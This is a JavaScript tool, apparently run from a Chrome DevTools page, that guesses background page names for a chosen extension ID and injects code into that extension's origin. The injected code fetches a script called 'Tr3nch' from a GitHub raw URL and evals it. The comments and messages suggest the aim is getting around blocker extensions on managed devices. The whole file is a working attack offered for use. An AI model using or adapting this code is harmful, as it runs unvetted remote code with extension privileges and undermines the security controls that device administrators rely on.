// This is incrediby janky and won't work for some extensions, but this is the only thing thats actually worked from just a devtools page
const COMMON_PAGES = [
  "background.html",
  "popup.html",
  "index.html",
  "options.html",
  "main.html",
  "_generated_background_page.html"
]; // if u have an extension that has a background page thats not in here pls ping me in Titanium Network and lmk
// yes ik I could have the function in xss.js, but I dont wanna break anything so ig ill just have it eval the base64 decode of the script
function ext_injecttr3nch(extid, script) {
  for (const page of COMMON_PAGES) { // Brute forcing potential background pages lmao :trolley:
    const url = `chrome-extension://${extid}/${page}`;
    try {
      const iframe = document.createElement("iframe");
      iframe.src = url;
      document.body.appendChild(iframe);
      iframe.onload = () => {
        try {
          const origin = new URL(url).origin;
          InspectorFrontendHost.setInjectedScriptForOrigin(origin, `
            fetch("https://raw.githubusercontent.com/Whelement/Tr3nch/refs/heads/main/tr3nch.js")
              .then(res => res.text())
              .then(eval)
              .catch(console.error);
          `);
          console.log("Injected into", url);
        } catch (e) {
          console.warn("Failed to inject into", url, e);
        }
      };

    } catch (e) {
      console.warn("Failed to create iframe for", url, e);
    }
  }
}
(async () => {
  while (true) {
    const extid = prompt("Enter extension ID to inject tr3nch into: ");
    
    if (!extid) continue;
    if (extid.toLowerCase() === "cancel") break;
    if (!/^[a-z]{32}$/.test(extid)) continue;

    try {
      await ext_injecttr3nch(extid);
      setTimeout(() => {
        alert("Injected! :trol:");
      }, 100);
      break;
    } catch (e) {
      alert("Injecting Tr3nch failed, either try again or go to the filesystem: url and disable blocker extensions");
      console.log(e);
      break;
    }
  }
})();
